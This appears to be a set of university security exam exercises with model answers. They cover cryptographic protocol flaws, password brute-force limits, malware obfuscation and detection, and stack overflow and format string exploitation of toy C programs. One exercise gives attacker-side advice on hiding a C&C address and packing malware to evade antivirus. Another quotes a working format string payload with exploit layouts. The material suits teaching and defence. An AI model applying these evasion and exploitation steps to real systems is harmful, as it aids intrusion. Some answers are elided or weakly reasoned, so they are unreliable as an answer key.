Consider an instant messaging service, run as a single web-application, where you want to provide message confidentiality and integrity, plus endpoint authentication. Consider the asymmetric encryption scheme in use to be encrypting any 1024 bit string into a 1024 bit ciphertext. All 1024 bit strings are valid plaintexts and ciphertexts. Encryption and decryption keys have the same format.
The users are trusting the messaging service provider not to be impersonating them. The server generates an encryption key pair for each user, at user enrollment time; and sends it to the user, while keeping a public billboard page where the pairs (username, public encryption key).
To initiate a conversation from A to B, user A draws a random bitstring of 1000 bit, appends 24 zero-valued bits to it, applies the decryption algorithm with her own private key, encrypts the result with the B’s public key (taken from the billboard) and sends it to B.
Upon receiving the message, B decrypts it with her own private key, and checks that the message is coming from A by encrypting it with A’s public key and testing if the last 24 bit are zero-valued. If the check passes, B will use the digest of a secure hash of the retrieved message, without the last 24 bit, as the symmetric key for the session. The symmetric key is then used to encrypt all messages and compute/verify a per-message MAC tag.

[3 points] 1. Analyze the protocol and describe, if existing, a strategy to impersonate A by an adversary E, or argue why the protocol prevents impersonation.
[3 points] 2. Consider the previous protocol, where the asymmetric encryption algorithm is replaced by an asymmetric signature algorithm, having asymmetric signature replace decryption and asymmetric verification replace encryption. Does the protocol provide impersonation resistance? Is the choice a viable one?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step-by-Step Pedagogical Solution:**

**Question 1: Impersonating User A**
*Understanding the Protocol:*
1. User A generates a 1000-bit random string $R$ and appends 24 zeros: $M = R || 0^{24}$.
2. A "signs" $M$ using their private decryption key: $S = Dec(K_{privA}, M)$.
3. A encrypts $S$ for B: $C = Enc(K_{pubB}, S)$ and sends it.
4. B decrypts $C$: $S' = Dec(K_{privB}, C)$.
5. B verifies A's "signature": $M' = Enc(K_{pubA}, S')$. If the last 24 bits are zeros, B accepts the session key.

*Finding the Flaw (Existential Forgery):*
The vulnerability lies in how the "signature" is verified. B only checks if the resulting plaintext ends in 24 zeros. Since the attacker E knows A's public key, E can work backwards using a guess-and-check approach:
1. E guesses a random 1024-bit string $S_{guess}$.
2. E computes $M_{guess} = Enc(K_{pubA}, S_{guess})$.
3. E checks if the last 24 bits of $M_{guess}$ are all zeros.
4. If not, E tries a new $S_{guess}$.

The probability of finding a match is $1 / 2^{24}$ (approx. 16.7 million attempts). This takes only a few minutes on a modern computer. Once found, E encrypts $S_{guess}$ with B's public key and sends it. B will verify it successfully with A's public key, allowing E to successfully impersonate A.

**Question 2: Replacing Encryption with Proper Signatures**
*Analyzing the Change:*
The protocol proposes replacing decryption with a proper digital signature algorithm ($Sign$) and encryption with verification ($Verify$).

While using a proper randomized digital signature scheme prevents the existential forgery attack described in Q1 (because an attacker cannot forge a signature without the private key), the proposed architectural change is mechanically flawed.

A signature verification algorithm ($Verify(Key, Message, Signature)$) does not output a recoverable plaintext message; it outputs a boolean value (True or False) indicating whether the signature is valid. 
If the protocol requires User A to perform a "signature verification action" on a random string (as a replacement for the second encryption step), it is impossible because A does not have a signature generated by B to verify against. Therefore, the choice is not viable because the protocol would break mechanically and fail to execute.
\end{verbatim}

\subsection{Exercise 2 - Introduction to Cryptography}
\subsubsection*{Problem}
\begin{verbatim}
1. [4 points] Consider a file storage service where the storage provider can only be trusted not to destroy data (i.e., no deletions allowed). Assume that the service offers a simple CRUD (Create, Read, Update, Delete) interface, and design a simple cryptographic protocol guaranteeing that no user can read the other user’s data, or modify it. In this design, you can avoid concerning yourself with DoS/flooding/storage exhaustion attacks. The file storage service does not, and must not perform user identification or authentication.
2. [3 points] Consider a web-based login form, employing a user id and a password. Assume that you want bruteforcing attacks on the password either to be unable to crack it with a probability higher than 1 in a billion (10^-9), or to take more than a lifetime (assume 120 years) to crack the password, on average. Assume that the password choice strategy is: 3 words diceware (i.e. uniform memoryless random choice) from a 2000 words dictionary. Analyze these two strategies and justify if they fit the requirements (either one of them, both, or none).
    1. Limit the amount of attempts to 10, then lock the account.
    2. Increment the delay before a password can be submitted by 10 ms at each failed attempt. Assume an initial artificial delay of 10 ms. Ignore all other delays (network, computation, typing) in the analysis.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### 1. Cryptographic Protocol Design for File Storage
**Step-by-Step Reasoning:**
The service does not authenticate users, and we cannot trust it with confidentiality or integrity. Thus, all security must be implemented client-side (Zero-Knowledge architecture).
- **Confidentiality:** The client must encrypt files before uploading them so the server cannot read them. A symmetric algorithm like AES-256 is ideal.
- **Integrity & Authenticity:** The client must ensure the server hasn't tampered with the ciphertext. A Message Authentication Code (MAC), such as HMAC or AES-CMAC, should be computed over the ciphertext. Authenticated Encryption (like AES-GCM) covers both.
- **Deleting files securely:** Since the server can't be trusted to verify identity, anyone could theoretically ask to delete a file. We need an authorization mechanism. The client can attach a secret `DELETETOKEN` to the file upon creation. To delete, the client proves knowledge of this token.

**Proposed Protocol:**
1. **Setup:** The client generates local symmetric keys and maintains a local index mapping file names to keys.
2. **Create:** The client generates a random `DELETETOKEN`. The file content is encrypted with a symmetric key (e.g., AES-256-CTR). The client computes a MAC over the ciphertext + the `DELETETOKEN`. The ciphertext and MAC are uploaded.
3. **Read:** The client downloads the file, verifies the MAC using the local symmetric key, and decrypts the content if the verification passes. This prevents reading modified data.
4. **Update:** The client essentially performs a Delete of the old file and a Create of the new file.
5. **Delete:** The client sends a deletion request containing the `DELETETOKEN` and the MAC computed over (file ID + `DELETETOKEN`). The server verifies the MAC and deletes the file only if it matches. This prevents unauthorized users from deleting files.

### 2. Password Brute-Force Strategies Analysis
**Step-by-Step Reasoning:**
First, we calculate the total password space (combinations). 
Diceware uses 3 words from a 2000-word dictionary. 
Total combinations = 2000^3 = 8 * 10^9 (8 billion).
The probability of a single guess being correct is 1 / (8 * 10^9) = 1.25 * 10^-10.

**Strategy 1: 10 Attempts Lockout**
- We want the probability of cracking to be < 10^-9 (1 in a billion).
- The attacker gets 10 attempts.
- Probability of success in 10 attempts = 10 * (1.25 * 10^-10) = 1.25 * 10^-9.
- **Conclusion:** 1.25 * 10^-9 is greater than the strict limit of 1.0 * 10^-9. Therefore, Strategy 1 **does not** meet the requirement.

**Strategy 2: Incremental Delay (10ms increase per attempt)**
- We want cracking to take > 120 years on average.
- On average, the attacker needs to try half the password space to succeed: (8 * 10^9) / 2 = 4 * 10^9 attempts.
- The delay increases arithmetically: 10ms, 20ms, 30ms ... 10 * N ms.
- Total time T for N attempts is the sum of an arithmetic progression: T = N * (N * 10) / 2 ms.
- Average time = (4 * 10^9) * (4 * 10^9 * 10) / 2 ms 
  = 16 * 10^19 / 2 ms = 8 * 10^19 ms.
- Convert to seconds: 8 * 10^16 seconds.
- Convert to years: 8 * 10^16 / (3600 * 24 * 365) = 2.5 * 10^9 years (2.5 billion years).
- **Conclusion:** 2.5 billion years is massively larger than 120 years. Therefore, Strategy 2 **perfectly meets** the requirement and works in practice.
\end{verbatim}


\section{Malware Security}
Exercises for Malware Security

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
Our systems have been compromised by very powerful malware. Luckily, we managed to collect a sample of the malware. Its code is reported below.
[Assembly code]
1. [1 point] Is the malware employing any obfuscation technique? If yes, specify which.
2. [2 points]
(a) Given your answer to the previous question, what class does this malware most likely belong to (polymorphic, metamorphic, evasive)?
(b) Can we say for sure that it does not belong to some classes?
3. [2 points] Considering the class this malware most likely belongs to, how would you use signatures to detect it?
(a) Specify which part(s) of the code you would use for generating the signatures.
(b) Specify which part(s) of the code cannot be used for generating signatures, explaining why.
4. [1 point] It turns out that the obfuscation engine is in truth a commercial code protector, which is also used by benign software to protect proprietary code. How does this change your answer to question 4.3? Explain why you think this may invalidate the solution you proposed.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**1.** Yes, the malware is employing an obfuscation technique known as a **packer or encryptor**. The visible code contains an encryption/decryption stub (a loop involving an XOR operation `xor cl, dl` and memory modification `mov BYTE PTR [eax], cl`) designed to decrypt the actual malicious payload located further down in memory at runtime.

**2. Malware Classification:**
**(a)** The malware most likely belongs to the **Polymorphic** class. Polymorphic malware utilizes an encryption wrapper to hide its core payload. Upon execution, the decryption stub runs, decrypting the payload into memory. Each time the malware propagates, it encrypts the payload with a different key, changing the file's static footprint.
**(b)** We can state with certainty that it is not purely **Metamorphic**. Metamorphic malware avoids simple encryption wrappers; instead, it completely rewrites and structurally translates its own assembly code (using instruction substitution, register swapping, and dead code insertion) for every infection while maintaining the original logic. The explicit presence of the XOR decoding loop strongly indicates a polymorphic design.

**3. Signature-based Detection:**
**(a)** To detect this polymorphic malware statically, the signature must target the **decryption stub** (the visible routine performing the XOR logic). Because the stub must remain executable on disk to bootstrap the decryption process, extracting a regular expression or wildcard signature from its instruction sequence is the only viable static detection method.
**(b)** We **cannot** generate a static signature from the actual malicious payload (the data located after the stub). Because the payload is encrypted with a varying key per infection, its byte sequence on disk changes entirely between samples. A signature based on the encrypted body would only match a single, specific instance of the malware.

**4. Impact of Commercial Code Protectors:**
If the obfuscation engine is actually a commercial code protector (e.g., UPX, VMProtect, Themida) heavily utilized by legitimate developers to protect proprietary software, generating a signature based solely on the decryption stub (as proposed in 3a) will result in catastrophic **False Positives**. The antivirus engine will blindly flag completely benign applications as malware simply because they utilize the exact same commercial protector. This completely invalidates the static signature approach. Detection must instead pivot to **Dynamic Analysis** (executing the file in a sandbox and scanning the payload *after* it decrypts itself in memory) or utilizing an unpacking engine to strip the protector before scanning.
\end{verbatim}

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
1. [2 points] Your program has to download some information from a server. You are confident that the IP address associated with that machine is known to AV providers. Therefore, you expect the AV deployed on the target machine to block your program as soon as it detects that address within the program code. Unfortunately, you don’t have enough time to deploy a different server or route the malware traffic through proxies, VPNs, or analogue architectures. How would you obfuscate only the IP address to prevent an AV to statically identify it? Provide a simple example to explain your solution.

2. [2 points] You are now afraid that, having used a known malware generator downloaded from the Internet, other parts of your code will be detected statically by the AV. Thus, you decide to further obfuscate the entire malware by compressing it with UPX, a known code packer that compresses the payload and decompresses it at runtime. Can you identify any shortcoming in this strategy? Name two possible ways in which the AV could still detect your program, explaining how they relate to the use of UPX.

3. [2 points] You decide not to use UPX for the reasons you highlighted above. Furthermore, you can’t use the obfuscation techniques you implemented at Q1 because you don’t have enough time to reverse-engineer and modify the malware. Luckily, you remember that you developed two obfuscation engines some time ago... The first one is a polymorphic engine... The other one is a metamorphic engine... Considering your belief that your malware may be detected due to the hard-coded IP address or some invariant code fragments produced by the generator that you used, which of your two obfuscation engines would you use to carry out the attack? Motivate your choice, naming every assumption you need to make.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
### Question 1: Obfuscating a Static IP Address

To evade static signature-based detection, the IP address string must not appear in plaintext within the compiled binary.

**Pedagogical Approaches to Data Obfuscation:**

1.  **Simple Encryption (e.g., XOR encoding):**
    -   *Concept:* XOR the IP address string with a hardcoded secret key before compiling. The binary only contains the ciphertext and the key. During execution, the malware XORs the ciphertext with the key again to recover the plaintext IP address in memory.
    -   *Example:* If IP is `9.7.6.5` and Key is `0xAA`. The binary stores `ciphertext = "9.7.6.5" ^ 0xAA`. At runtime: `IP = ciphertext ^ 0xAA`.
2.  **Algorithmic Computation:**
    -   *Concept:* Do not store the IP address at all. Instead, store mathematical operations that, when calculated at runtime, yield the numerical representation of the IP address.
    -   *Example:* To hide `7.15.6.8`, the code might execute: `IP = construct_ip(2+5, 10+5, 3*2, 16/2)`.
3.  **Encoding Techniques:**
    -   *Concept:* Represent the IP address using a non-standard encoding scheme (like Base64, Hexadecimal, or a custom alphabet). The AV scanner looking for standard dotted-decimal notation (`X.X.X.X`) will miss it. The malware decodes it in memory just before initiating the network connection.
    -   *Example:* Storing the hex representation of the 32-bit integer form of the IP, and converting it back to a socket structure at runtime.

### Question 2: Shortcomings of Using a Known Packer (UPX)

While packing compresses and obfuscates the original code, relying on a common tool like UPX has significant drawbacks against modern Antivirus (AV) solutions.

**Two Ways AVs Detect Packed Malware:**

1.  **Automated Unpacking (Static Reversal):** UPX is a standard, open-source tool. AV engines perfectly understand its compression algorithms and stub structure. When an AV scans a UPX-packed file, it simply runs an internal UPX unpacker to extract the original payload in memory and then scans the extracted, plaintext malware against its signature database.
2.  **Heuristic/Dynamic Detection (Suspicion of Packing):** The mere presence of a packing stub (the small bit of code that decompresses the rest) is a strong heuristic indicator of suspicious intent. Legitimate software rarely uses packers like UPX anymore. An AV might flag the file as `Suspicious.Packed.UPX` purely because it is obfuscated, regardless of the payload's nature. Alternatively, the AV might execute the file in a secure sandbox (dynamic analysis), observe the decompression routine running in memory, and then scan the memory pages once the real payload is exposed.

### Question 3: Polymorphic vs. Metamorphic Engines

**Goal:** Hide a known IP address and invariant code fragments generated by a malware builder.

**Analysis of Options:**

-   **Polymorphic Engine:** This engine encrypts the entire main payload (including data sections where the IP might reside and code sections with the generator's signatures) and attaches a unique, varying decryption routine (the stub) to it. 
    -   *Pros:* Because the payload is encrypted, the hardcoded IP address and the static signatures of the generator are completely hidden on disk.
    -   *Cons:* Once the malware runs and the stub decrypts the payload into memory, the original payload (with its known signatures and IP) is exposed. If the AV performs memory scanning during execution, it will catch it.

-   **Metamorphic Engine:** This engine mutates the *code* itself (instruction substitution, register swapping, inserting junk code) without encrypting it.
    -   *Pros:* The code looks completely different structurally every time, making traditional static signature matching of the *code* impossible.
    -   *Cons:* Standard metamorphic engines primarily focus on altering executable instructions (the `.text` section), not data. If the IP address is stored as a string constant in a data section (like `.rdata` or `.data`), the metamorphic engine will likely leave it untouched.

**Conclusion & Motivation:**

I would choose the **Polymorphic Engine**, subject to specific assumptions.

**Why Polymorphic?** It provides a blanket guarantee that *everything* inside the payload—both the static code signatures from the generator and the hardcoded IP address in the data section—will be encrypted and thus hidden from static disk-based AV scanners.

**Assumption Required for Polymorphic:** We must assume that the AV relies primarily on *static analysis* of the file on disk. If the AV uses aggressive dynamic behavioral analysis or memory scanning, the decrypted payload will eventually be caught.

*(Alternatively, one could argue for Metamorphic, but with a strict assumption)*

**Why Metamorphic?** If we assume the AV only scans for code signatures and we are more worried about the AV identifying the decryption stub of a polymorphic engine.

**Assumption Required for Metamorphic:** We **must** assume that this specific metamorphic engine is advanced enough to also obfuscate data constants (like strings representing IP addresses) and not just CPU instructions. If it only mutates code, the static IP address string will remain in plaintext, and the static AV will detect it immediately, defeating the purpose.
\end{verbatim}

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
Nautilus Institute was recently targeted by a new malware... Which technique does this malware employ? What type of analysis would you apply to DETECT the malware? strings command output... Which technique does the new variant employ?
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Analyzing the First Malware Sample**
- **Observation**: Sample 1 uses a manual loop `jmp` and `add` to compute a power operation, whereas Sample 2 directly uses a `call <pow>` function. Despite looking entirely different syntactically, both pieces of code achieve the exact same semantic outcome.
- **Technique**: This is **Metamorphism**. Metamorphic malware completely rewrites its own code (changing instructions, swapping registers, replacing loops with functions, etc.) while preserving its original functionality, meaning no two infections have the same signature.
- **Detection Strategy**: Because the code changes drastically, static signature-based detection is useless. The best approach is **Dynamic Analysis (Behavioral Analysis)**. By running the malware in a sandbox and monitoring its behavior (API calls, file modifications, network connections), security tools can identify its malicious intent regardless of how the code is structured.

**Step 2: Analyzing the Second Variant**
- **Observation**: Running the `strings` command on the new variant reveals garbled, seemingly random strings like `IuDSWH`, `s2V^`, `UPX!u`, whereas the first sample revealed standard readable library names like `libc.so.6`.
- **Technique**: This variant employs **Polymorphism via Packing** (specifically hinted at by `UPX!u`, a known packer). Packers compress and encrypt the malware's payload, wrapped in a small decryption stub. The signature changes because the encrypted payload looks random, but the underlying execution logic remains identical once decrypted in memory.
- **Detection Strategy**: Static detection fails because the payload is encrypted. The malware must be caught during execution using **Dynamic Analysis**, where security tools can analyze it after it has unpacked itself into memory, or by using unpacking tools/heuristics to reveal the hidden code.
\end{verbatim}

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
101 Inc. was recently targeted by a new malware named Crudelia... Which stealth technique does this malware employ? What type of analysis would you apply... ptrace()...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Stealth Techniques**
- **Technique**: The code uses a `while (time(NULL) < time_1)` loop to sleep and wait. This is a **Time-Bomb / Dormant Code** technique. The malware remains completely inert and benign until a specific epoch timestamp is reached, successfully bypassing automated sandboxes that only run samples for a few minutes.
- **Analysis Approach**: Static analysis is highly effective here because the malware is not obfuscated; reverse engineering easily reveals the logic. Dynamic analysis will fail unless the analyst manually manipulates the system clock inside the sandbox to a time past the bomb's threshold.

**Step 2: Analyzing the Variant (Anti-Debugging)**
- **Observation**: The variant includes a call to `ptrace(PTRACE_TRACEME, 0, 0, 0)`. If it returns -1, it prints a message and exits.
- **Technique**: This is a classic **Anti-Debugging** technique. In Linux, a process can only be traced by one debugger at a time. By calling `ptrace` on itself, the malware ensures that if an analyst is already debugging it (e.g., using GDB), the call will fail (-1), and the malware safely aborts before revealing its malicious payload.
- **Bypass**: To dynamically analyze this, an analyst must patch the binary (changing the assembly instruction to skip the `if` check) or configure the debugger to catch the `ptrace` syscall and fake a successful return value (0).
\end{verbatim}

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
Pseudo-code... Name the evasive techniques... Why is signature-based detection usually ineffective against metamorphic malware?...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Evasive Techniques in Pseudo-Code**
- **Lines 1-2 (`if is_debugger_present(): exit(-1)`)**: This is an **Anti-Debugging** technique. The malware checks the environment; if it senses it's being analyzed by a reverse engineer, it terminates itself immediately to hide its true payload.
- **Lines 4-8 (`while True: counter+=1; if counter - time > 0: break`)**: This is a **Dormant Code / Time-bomb / Stall** technique. By executing a meaningless, computationally heavy loop, the malware wastes time. Automated sandboxes only analyze files for a few minutes; the stall tactic ensures the malicious payload only executes *after* the sandbox gives up and flags the file as clean.

**Step 2: Metamorphic Malware and Signatures**
- **The Problem**: Signature-based detection relies on identifying known, static sequences of bytes (hashes or specific assembly patterns). 
- **Ineffectiveness**: Metamorphic malware contains an internal engine that completely rewrites its own code every time it infects a new system. It swaps registers, substitutes instructions with equivalents (e.g., changing `add eax, 1` to `inc eax`), and inserts junk code. Because there is absolutely no invariant code between generations, static signatures will never match, rendering traditional antivirus useless.

**Step 3: Detecting Metamorphic Malware**
- Since static analysis fails, defenders must use **Dynamic/Heuristic Analysis**.
- **Execution**: The malware is executed inside a heavily monitored, hardened Virtual Machine (Sandbox). 
- **Monitoring**: Security software hooks into the operating system's API to monitor the program's *behavior* rather than its code. If the program attempts to inject code into `explorer.exe`, modify the registry for persistence, or open a network connection to a known Command & Control server, the heuristic engine flags it as malicious based purely on its actions.
\end{verbatim}

\subsection{Exercise 6 - Malware Security}
\subsubsection*{Problem}
\begin{verbatim}
Neverland Inc. was recently targeted by a new malware named Spugna... Which stealth technique... dynamic analysis... polymorphism...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**Step 1: Identifying Stealth Techniques**
- **Observation**: The code sends device info to a Command and Control (C&C) server via HTTP GET. It enters an infinite loop, continuously polling the server. It only breaks the loop and executes the malicious payload (`evil()`) if the server specifically responds with the string "go".
- **Technique**: This is **Event-Triggered Dormant Code**. The malware remains inert and benign until it receives a direct cryptographic or network signal from its master. This effortlessly defeats automated sandboxes, which are disconnected from the internet or return generic responses; without the exact "go" signal, the sandbox sees nothing malicious.

**Step 2: Dynamic Analysis Approach**
- **Challenge**: Standard dynamic analysis will yield nothing because the C&C server is likely offline or refusing to respond to sandbox IPs.
- **Solution**: To force the malware's hand, analysts must employ network simulation. They configure the sandbox's DNS to redirect the C&C domain to an analyst-controlled local server. They then intercept the HTTP requests and actively forge the "go" response back to the malware. Once the malware receives the spoofed signal, it will "detonate," allowing the analyst to monitor its actual malicious behavior (file encryption, registry edits, etc.).

**Step 3: Analyzing Polymorphic Variants**
- **Observation**: A new variant is discovered where the payload is encrypted (`decrypt_payload(); evil(); encrypt_payload();`).
- **Technique**: This is **Polymorphism**. The core malicious code is encrypted and changes its signature on disk for every infection, decrypting itself only dynamically in memory.
- **Impact on Analysis**: This strongly affects static analysis (making signatures useless) but has **no effect** on the dynamic analysis strategy outlined above. Because dynamic analysis monitors execution behavior in memory *after* decryption, the forged C&C network response will still trigger the payload, and the sandbox will successfully log the malware's true actions.
\end{verbatim}


\section{Binary Vulnerabilities}
Exercises for Binary Vulnerabilities

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Consider the following C code... 3.1 Fill the following table by reporting the vulnerabilities... 3.2 Given the vulnerability... explain how you would exploit them to take control of the program and execute shellcode. Assume the shellcode is 8 bytes long... 3.3 Show the effect of the identified vulnerabilities on memory...
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
3.1 Buffer overflow at line 14 (not exploitable due to canary). Format string at line 21 (exploitable).

3.2 [0.5 points] The buffer overflow is not exploitable. The size would enable sEIP overwriting, but the presence of a well-implemented stack canary prevents it. [1.5 points] The format string vulnerability can be exploited to gain RCE. The attacker needs to know: the address of the write target (where to write), the stack offset of the format string, the address of the shellcode inside the creds.username or creds.password buffer (what to write). Given this prerequisite knowledge, the attacker can store the format string and the shellcode in the creds.username buffer, and after the execution of line 21 the sEIP will be overwritten with the address of the shellcode. Since the stack is executable, this guarantees code execution.

3.3 Stack layout before and after format string: creds.username[0:3] (ESP), ..., creds.username[124:127], creds.password[0:3], ..., creds.password[28:31], canary, sEBP (EBP), sEIP (main). After format string, the sEIP (main) is overwritten with the shellcode start address (~&NOP sled start).

### Improved Step-by-Step Explanation:
For 3.1: Line 14 uses `read(0, creds.username, 256);` but `creds.username` is only 128 bytes. This causes a buffer overflow. However, it's marked 'NO' for exploitable because the problem states a stack canary is present and not guessable, preventing direct EIP overwrite. Line 21 uses `printf(creds.username);` which directly passes user input to `printf` as the format string, leading to a format string vulnerability. This is marked 'YES' for exploitable.
For 3.2: To exploit the format string vulnerability, we can use the `%n` format specifier to write arbitrary data to an arbitrary memory address. We want to overwrite the saved return instruction pointer (sEIP) of `check_credentials` so that when it returns, it jumps to our shellcode. We need to know where the sEIP is stored (the write target), the offset on the stack to reach our format string parameters, and the address where our shellcode will be stored (likely within `creds.username`). We craft a payload containing the shellcode and the format string to overwrite the sEIP.
For 3.3: The stack grows from high to low memory. The local variables `creds.username` and `creds.password` are placed below the canary, saved EBP, and saved EIP. The format string exploit uses `printf` to perform a write operation to the memory location holding the sEIP, changing its value to point to the shellcode stored inside the local buffer.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
1. #include <stdio.h>... 1. Fill out the following table by reporting all the vulnerabilities... 2. Can you find a way to take control of the program by executing shellcode? 3. Show the effect of the identified vulnerabilities on memory.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
1. Buffer Overflow at Line 17 (Exploitable: YES). Format String (too small for RCE, ok for leak) at Line 25 (Exploitable: YES).
2. Yes, exploitation is possible via the stack buffer overflow. The call to `read(0, log.alert, log.size)` writes `log.size` bytes into an 4-byte buffer. The bounds check is performed after the write, so it does not prevent the overflow. By providing a sufficiently large value for `log.size`, an attacker can overwrite adjacent stack data up to the saved return address and redirect execution to the shellcode. The shellcode can be written AFTER the sEIP, in ENV, etc. The format string vulnerability in `printf(log.alert)` is present but not exploitable for RCE. The buffer is only 4 bytes long, which is insufficient to place controlled addresses and meaningful format specifiers.
3. Stack layout: Low memory to High memory: `size` (4 bytes), `alert[0:3]` (4 bytes), padding/compiler added (if any), sEBP, sEIP. The `read` call overflows `alert`, overwriting the variables above it, eventually reaching and overwriting sEIP with a pointer to the shellcode, which is located further down the stack.

### Improved Step-by-Step Explanation:
For 1: Line 17 performs `read(0, log.alert, log.size);`. The `log.alert` buffer is only 4 bytes. If the user provides a `size` greater than 4, `read` will write past the buffer's bounds, causing a buffer overflow. Line 25 executes `printf(log.alert);`. Since `log.alert` is user-controlled, this is a format string vulnerability.
For 2: The buffer overflow is exploitable because the size check (`if (log.size > sizeof(log.alert))`) happens *after* the `read` function has already executed and corrupted the stack. This is a classic "time-of-check to time-of-use" logic flaw. The attacker inputs a large size, overflows the `alert` buffer, overwrites the saved EBP and saved EIP, and points the sEIP to their shellcode. The format string is practically unexploitable for code execution because you cannot fit enough format specifiers and target addresses into a mere 4 bytes.
For 3: The struct `Log` contains `size` and `alert[4]`. `alert` is placed at a higher memory address than `size` (or vice versa depending on exact compiler alignment, but typically sequentially). Crucially, the buffer overflow writes from low memory to high memory. It overflows `alert`, overwriting the saved frame pointer (sEBP) and the saved return instruction pointer (sEIP). By carefully crafting the input, the attacker replaces the legitimate sEIP with the memory address where the shellcode begins.
\end{verbatim}

\subsection{Exercise 3 - Binary Vulnerabilities}
\subsubsection*{Problem}
\begin{verbatim}
Assume that:
- The C standard library is loaded at a known address during every execution of the program, and that the address of the function system() is 0xf4d0e2d3.
- Environment variables are located in the highest addresses.
- The program is compiled for the x86 architecture (32 bit) and for an environment that adopts the usual cdecl calling convention. Furthermore, assume that no compiler-level or OS-level mitigations against the exploitation of memory corruption errors are present (unless specified otherwise).

01 #include <stdio.h>
02 #include <stdlib.h>
03 #include <string.h>
04 #include <time.h>
05
06 typedef struct {
07     char base[8];
08     int r;
09     char buf[64];
10     char *str_p;
11     char canary[4];
12 } data_t;
13
14 void guess(int num, char *str, data_t *data) {
15
16     snprintf(data->buf, num, str);
17
18     if (strncmp(data->buf, "backdoor", 8) == 0){
19         scanf("%8s", data->str_p);
20
21         if (num == data->r){
22             system("/bin/sh\0");
23         }
24     }
25
26     if (strcmp(data->canary, "XXX") != 0)
27         abort();
28 }
29
30 int main(int argc, char** argv) {
31     int num;
32     data_t data;
33
34     srand(time(NULL));
35     num = atoi(argv[1]);
36
37     data.r = rand();
38     strcpy(data.canary, "XXX");
39     data.str_p = data.base;
40
41     guess(atoi(argv[1]), argv[2], &data);
42 }

1. [1 point] The program is affected by typical buffer overflow and format string vulnerabilities. Complete the following table, focusing on a vulnerability per row.
2. [2 points] 2. Focus only on the stack-based buffer overflow(s) you found. Write an exploit for this vulnerability that must execute the following shellcode, composed of 16 bytes, which opens a shell: 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90.
3. [2 points] Focus only on the format string vulnerability you found. Assume that you were able to find this working exploit to execute a piece of shellcode saved in an environment variable.
"\xb6\x06\x3a\x44\xb8\x06\x3a\x44%26543c%4$hn%9529c%5$hn"'`
4. [1 points] Consider ONLY the “Non-executable stack (NX)” mitigation technique. A friend of yours suggests that there is an alternative way to exploit the vulnerability/ies you found to spawn a privileged shell in the program without executing any shellcode or calling library functions.
\end{verbatim}

\subsubsection*{Solution}
\begin{verbatim}
**1. Vulnerabilities:**
- **Buffer Overflow**: Occurs at Line 16. The length `num` is user-controlled via `argv[1]` and can exceed the size of `data->buf` (64 bytes). Fixed line: `snprintf(data->buf, sizeof(data->buf), "%s", str);`
- **Format String**: Occurs at Line 16. The user input `str` is passed directly as the format string parameter. Fixed line: `snprintf(data->buf, num, "%s", str);`

**2. Buffer Overflow Exploit:**
**2.a)** To exploit the buffer overflow, we provide a `num` large enough to overflow `data.buf` and reach the return address of `main` (since `data` is stored in `main`'s stack frame). We must bypass the local canary check by correctly overwriting `data.canary` with "XXX\0". 
Assumptions: We load the 16-byte shellcode into an environment variable (e.g., `SHELLCODE`), which resides at a predictable high address (e.g., `0xbffffff0`).
- `argv[1]`: A value larger than the offset to the return address (e.g., 200).
- `argv[2]`: A payload structured as: 64 bytes of junk (filling `buf`), followed by 4 bytes of junk (overwriting `str_p`), followed by "XXX\0" (overwriting `canary`), followed by padding to overwrite `main`'s saved EBP, and finally the 4-byte address of the environment variable holding the shellcode, overwriting `main`'s saved return address.

**2.b) Stack Layout (High to Low Addresses):**
[ ... Environment variables (Shellcode) ]
[ argc, argv ]
[ Return Address of main ] -> Overwritten with Address of Shellcode
[ Saved EBP of main ] -> Overwritten with dummy bytes
[ data.canary (4 bytes) ] -> Overwritten with "XXX\0"
[ data.str_p (4 bytes) ] -> Overwritten with dummy bytes
[ data.buf (64 bytes) ] -> Overwritten with junk bytes
[ data.r (4 bytes) ]
[ data.base (8 bytes) ]
[ num (4 bytes) ]
<- ESP

**3. Format String Exploit Breakdown:**
The exploit writes a 32-bit address in two 16-bit halves using `%hn`.
- **The address where we want to write**: The payload starts with the addresses `0x443a06b6` and `0x443a06b8`. These point to the two contiguous memory half-words of the saved return address on the stack.
- **What to write**: The characters printed so far dictate the value written by `%hn`. First write: 8 bytes (addresses) + 26543 = 26551 (0x67B7) written to `0x443a06b6`. Second write: 26551 + 9529 = 36080 (0x8CF0) written to `0x443a06b8`. The final combined address pointing to the shellcode is `0x8CF067B7`.
- **The displacement**: The format specifiers `%4$hn` and `%5$hn` indicate that the addresses to write to are located at the 4th and 5th positions (words) up the stack relative to the format string's processing pointer.

**4. NX Mitigation Alternative:**
- **Buffer Overflow**: We can bypass NX entirely by leveraging the program's built-in backdoor logic (`system("/bin/sh\0")`). We set `argv[2]` to start with "backdoor" and pad it to overflow `buf`. We overwrite `data.str_p` with the address of `data.r`. Because `str` starts with "backdoor", the program executes `scanf("%8s", data->str_p)`. Since `data.str_p` now points to `data.r`, our `scanf` input from stdin overwrites `data.r`. If we provide the string representation of `num`, then `num == data->r` evaluates to true, triggering the built-in `system("/bin/sh")` call without needing an executable stack or external ROP chains.
- **Format String**: We can use the `%n` format specifier to achieve arbitrary write capabilities. We craft `str` to output exactly `num` characters, and then use `%n` targeting the address of `data.r`. This overwrites `data.r` with the value of `num`, satisfying the condition `num == data->r` and successfully dropping into the privileged shell.
